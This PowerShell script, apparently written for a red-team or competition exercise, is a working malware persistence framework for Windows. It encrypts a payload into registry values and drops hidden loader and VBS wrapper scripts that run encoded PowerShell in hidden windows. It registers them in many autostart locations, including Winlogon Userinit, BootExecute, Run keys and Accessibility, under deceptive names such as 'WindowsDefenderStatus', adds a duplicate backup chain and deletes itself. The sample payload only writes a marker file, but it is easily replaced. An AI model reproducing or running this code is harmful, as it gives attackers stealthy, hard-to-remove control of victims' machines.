$plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"

function e($t,$s,$l){$d=New-Object Security.Cryptography.Rfc2898DeriveBytes($l,[Text.Encoding]::UTF8.GetBytes($s),10000);$c=[Security.Cryptography.Aes]::Create();$c.Key=$d.GetBytes(32);$c.IV=$d.GetBytes(16);$x=$c.CreateEncryptor();$b=$x.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($t),0,$t.Length);$x.Dispose();$c.Dispose();$d.Dispose();[Convert]::ToBase64String($b)}

function r($k,$n,$v){if(!(Test-Path $k)){New-Item $k -Force|Out-Null};Set-ItemProperty $k $n $v -Force -EA 0|Out-Null}

# PRIMARY CHAIN - Store encrypted payload
$e1=e $plainPayload "StaticSalt1234" "S3cr3tK3y!2024#Showdown"
r "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "DriverData" $e1

# PRIMARY CHAIN - Loader script
$l1='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("S3cr3tK3y!2024#Showdown",[Text.Encoding]::UTF8.GetBytes("StaticSalt1234"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" DriverData -EA 0).DriverData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$l1|Out-File "$env:SystemRoot\Temp\syshelper.ps1" -Encoding ASCII -Force;(gi "$env:SystemRoot\Temp\syshelper.ps1" -Force).Attributes=6
$eL1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l1))

# PRIMARY CHAIN - VBS wrapper
$v=$null
foreach($x in @("$env:ProgramData\Microsoft\Installer\msihelper.vbs","$env:ProgramData\Microsoft\Windows\Caches\cache.vbs")){
try{$d=Split-Path $x;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c=@();for($i=0;$i -lt $eL1.Length;$i+=8){$c+=$eL1.Substring($i,[Math]::Min(8,$eL1.Length-$i))}
$vbs="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c -join '""&""')""`nsh.Run c,0,False"
Set-Content $x $vbs -Encoding ASCII -Force;(gi $x -Force).Attributes=6;$v=$x;break}catch{}}
$c=if($v){"wscript.exe //B //Nologo `"$v`""}else{"powershell.exe -Exec Bypass -Window Hidden -Enc $eL1"}

# HKLM Triggers
$w=(gp "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" Userinit -EA 0).Userinit
$n=if($w -and $w -notlike "*$c*"){"$w,$c"}elseif(!$w){"C:\Windows\system32\userinit.exe,$c"}else{$w}
r "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Userinit" $n

$b=(gp "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" BootExecute -EA 0).BootExecute
$m=if($b -and $b -notlike "*$c*"){"$b`n$c"}elseif(!$b){"autocheck autochk *`n$c"}else{$b}
r "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" "BootExecute" $m

r "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" "SystemHelper" $c
r "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "OneTimeSetup" $c
r "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices" "ServiceHost" $c
r "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsDefenderStatus" $c
r "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsDefenderStatus" $c

# BACKUP CHAIN - Store encrypted payload
$e2=e $plainPayload "DifferentSalt5678" "BackupKey!2024#DifferentPassword"
r "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" "CompatData" $e2

# BACKUP CHAIN - Loader script
$l2='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("BackupKey!2024#DifferentPassword",[Text.Encoding]::UTF8.GetBytes("DifferentSalt5678"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" CompatData -EA 0).CompatData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$l2|Out-File "$env:SystemRoot\Temp\syshelper_backup.ps1" -Encoding ASCII -Force;(gi "$env:SystemRoot\Temp\syshelper_backup.ps1" -Force).Attributes=6
$eL2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l2))

# BACKUP CHAIN - VBS wrapper
$bvp="$env:ProgramData\Microsoft\Internet Explorer\UserData\iehelper.vbs"
$d=Split-Path $bvp;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c2=@();for($i=0;$i -lt $eL2.Length;$i+=8){$c2+=$eL2.Substring($i,[Math]::Min(8,$eL2.Length-$i))}
$v2="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c2 -join '""&""')""`nsh.Run c,0,False"
Set-Content $bvp $v2 -Encoding ASCII -Force;(gi $bvp -Force).Attributes=6
$c2e="wscript.exe //B //Nologo `"$bvp`""

# BACKUP CHAIN - Triggers
r "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Startup" $c2e
r "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" "StartupPrograms" $c2e

# Self-delete
$m=$MyInvocation.MyCommand.Path;if(Test-Path $m){Start-Job -ScriptBlock{Start-Sleep 5;Remove-Item $using:m -Force -EA 0}|Out-Null}